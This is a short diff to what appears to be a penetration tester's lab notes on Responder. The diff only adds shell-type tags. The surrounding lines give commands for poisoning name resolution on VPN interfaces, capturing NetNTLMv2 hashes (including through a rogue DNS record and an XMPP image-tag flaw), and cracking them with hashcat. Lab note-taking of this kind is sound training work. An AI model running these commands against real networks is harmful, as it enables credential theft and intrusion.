@@ -5,6 +5,7 @@ LLMNR/NBT-NS/mDNS poisoner and rogue SMB/HTTP server. Used to capture NetNTLM(v1
 ## Commands Used
 
 ### Start Responder on the Breaching AD VPN interface
+<!-- cmd: linux -->
 ```bash
 sudo responder -I breachad
 ```
@@ -13,6 +14,7 @@ Used on: **Breaching Active Directory**
 captured a NetNTLMv2 challenge for `ZA\svcFileCopy`.
 
 ### Start Responder on the VPN interface
+<!-- cmd: linux -->
 ```bash
 sudo responder -I tun0
 ```
@@ -28,6 +30,7 @@ combined with a rogue A-record (see `dnstool.md`) to force `SQL07` → attacker 
 4. Captured NetNTLMv2 hash → crack with `hashcat -m 5600`.
 
 ### Start Responder to capture NTLMv2 via XMPP img tag (CVE-2020-12772)
+<!-- cmd: linux -->
 ```bash
 sudo responder -I tun0 -v
 ```
